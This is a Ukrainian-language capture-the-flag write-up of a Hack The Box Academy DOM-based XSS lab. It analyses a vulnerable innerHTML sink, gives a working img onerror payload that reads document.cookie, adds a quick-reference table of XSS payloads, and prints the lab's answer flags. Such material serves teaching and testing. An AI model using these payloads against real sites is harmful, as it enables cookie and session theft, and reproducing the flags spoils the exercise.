## XSS — DOM-Based XSS: `document.cookie`

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)
**Секція:** [DOM-Based XSS](https://academy.hackthebox.com/app/module/103/section/974)
**Завдання:** Змінити JS-payload щоб показав cookie замість URL
**Прапор:** `HTB{pur3ly_cl13n7_51d3}`

***

## Концепція

**DOM-Based XSS** — payload ніколи не доходить до сервера. Вразливість живе повністю на клієнті: JS-код читає дані з `document.URL` / `location.hash` і вставляє їх у DOM через `innerHTML` без санітизації. Сервер не бачить атаки → WAF/IDS на рівні HTTP сліпі.

***

## Крок 1 — Аналіз JS-коду сторінки

Відкриваємо вихідний код:
```
view-source:http://TARGET_IP:TARGET_PORT/
```
або окремий скрипт:
```
view-source:http://TARGET_IP:TARGET_PORT/script.js
```

**Вразливий фрагмент:**
```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

**Що тут не так:**
- `document.URL` → читає hash-частину URL (`#task=...`) на клієнті
- `decodeURIComponent(task)` → розкодовує URL-encoded символи
- `.innerHTML = ...` → вставляє результат як HTML **без екранування**

`innerHTML` — це `sink` (точка запису). `document.URL` — це `source` (джерело даних). Source → Sink без санітизації = DOM XSS.

***

## Крок 2 — Чому `<script>` не спрацює

```html
<!-- НЕ спрацює: -->
#task=<script>alert(document.cookie)</script>
```

`<script>` вставлений через `innerHTML` браузер **не виконує** — це поведінка специфікації HTML5. Потрібен вектор через event handler.

***

## Крок 3 — Payload через `<img onerror>`

```
http://TARGET_IP:TARGET_PORT/#task=<img src=x onerror=alert(document.cookie)>
```

**Механіка:**
1. `src=x` → браузер намагається завантажити зображення `x` → 404/помилка
2. `onerror=` → спрацьовує event handler
3. Виконується `alert(document.cookie)`

Вставляємо payload у адресний рядок Firefox → Enter → з'являється alert з куками.

***

## Альтернатива — Firefox DevTools

**Варіант A — Console:**
```javascript
// F12 → Console
document.cookie
```

**Варіант B — Storage Inspector:**
```
F12 → Storage → Cookies → [ім'я хоста]
```

***

## Чому відповідь друге значення

У alert відображається:
```
cookie=HTB{r3fl3c73d_b4ck_2_m3}; HTB{pur3ly_cl13n7_51d3}
```
Перше — залишковий кукі з попередньої секції (Reflected XSS), другий — **поточний прапор цього завдання**.

***

## Порівняння трьох типів XSS

| | Stored | Reflected | DOM-Based |
|---|---|---|---|
| Payload зберігається на сервері | ✅ | ❌ | ❌ |
| Запит іде на сервер | ✅ | ✅ | ❌ (hash не надсилається) |
| Вектор | `innerHTML` / БД | GET/POST параметр | `document.URL`, `location.hash` |
| WAF бачить payload | ✅ | ✅ | ❌ |
| `<script>` через `innerHTML` | ❌ | ❌ | ❌ |
| Bypass | — | — | `<img onerror>`, `<svg onload>` |

***

## XSS Quick Reference (оновлено)

| Payload | Призначення |
|---|---|
| `<script>alert(document.cookie)</script>` | Stored / Reflected XSS |
| `<img src=x onerror=alert(document.cookie)>` | DOM XSS / bypass `<script>` фільтру |
| `<svg onload=alert(document.cookie)>` | Альтернатива через SVG |
| `"onmouseover="alert(document.cookie)` | Bypass через HTML атрибут |
| `javascript:alert(document.cookie)` | У `href` атрибутах |

***

## Прапор

```
HTB{pur3ly_cl13n7_51d3}
```
